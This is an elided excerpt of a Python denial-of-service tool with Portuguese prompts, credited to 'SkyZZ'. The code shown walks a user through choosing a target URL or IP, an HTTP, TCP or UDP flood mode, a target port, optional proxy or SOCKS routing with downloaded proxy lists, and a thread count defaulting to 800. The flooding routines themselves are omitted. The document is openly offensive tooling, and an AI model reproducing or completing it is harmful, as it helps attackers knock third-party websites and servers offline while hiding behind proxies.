...
if sys.platform.startswith("linux"): # C0d3d by UN5T48L3
	...
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # C0d3d By SkyZZ
...
-------------------------------------------By: SkyZZ-------------------------------------------
oooooooooo.   oooooooooo.                      ooooooooooooo                     oooo           
`888'   `Y8b  `888'   `Y8b                     8'   888   `8                     `888           
 888      888  888      888  .ooooo.   .oooo.o      888       .ooooo.   .ooooo.   888   .oooo.o 
 888      888  888      888 d88' `88b d88(  "8      888      d88' `88b d88' `88b  888  d88(  "8 
 888      888  888      888 888   888 `"Y88b.       888      888   888 888   888  888  `"Y88b.  
 888     d88'  888     d88' 888   888 o.  )88b      888      888   888 888   888  888  o.  )88b 
o888bood8P'   o888bood8P'   `Y8bod8P' 8""888P'     o888o     `Y8bod8P' `Y8bod8P' o888o 8""888P' 
-------------------------------------------By: SkyZZ-------------------------------------------
...
def starturl(): # C0d3d by SkyZZ
	global url
	global url2
	global urlport

	url = input("\nInsira o URL/IP: ").strip()
	...
	try:
		...
		print("Alguma coisa está errada, tente novamente.")
		starturl()
...
def floodmode():
	global choice1
	choice1 = input("Você deseja executar a inundação HTTP '0' (Recomendada), a inundação TCP '1' ou a inundação UDP '2'?")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # C0d3d By SkyZZ
				print("Você precisa executar este programa como root para usar a inundação TCP / UDP.") # C0d3d By SkyZZ
				exit(0) # C0d3d By SkyZZ
			else: # C0d3d By SkyZZ
				floodport() # C0d3d By SkyZZ
		except:
			pass
	elif choice1 == "2":
		try:
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # C0d3d By SkyZZ
		if port in portlist: # C0d3d By SkyZZ
			pass # C0d3d By SkyZZ
		else: # C0d3d By SkyZZ
			print ("Alguma coisa está errada, tente novamente.")
			floodport() # C0d3d By SkyZZ
	except ValueError: # C0d3d By SkyZZ
		print ("Alguma coisa está errada, tente novamente.") # C0d3d By SkyZZ
		floodport() # C0d3d By SkyZZ
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Você quer o modo Proxy/Socks? Responda '[Y]Yes' para ligar ou '[N]No' para não ligar.: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choicedownproxy():
	choice4 = input("Você quer baixar uma nova lista de proxy? Responda '[Y]Yes' para fazer isso: ")
	if choice4 == "y":
		choicemirror1()
	else:
		proxylist()
...
def choicedownsocks():
	choice4 = input("Quer baixar uma nova lista de meias? Responda '[Y]Yes' para fazer isso: ")
	if choice4 == "y":
		choicemirror2()
	else:
		proxylist()
...
def numthreads():
	global threads
	try:
		threads = int(input("Insira o número de fios: "))
	except ValueError:
		threads = 800
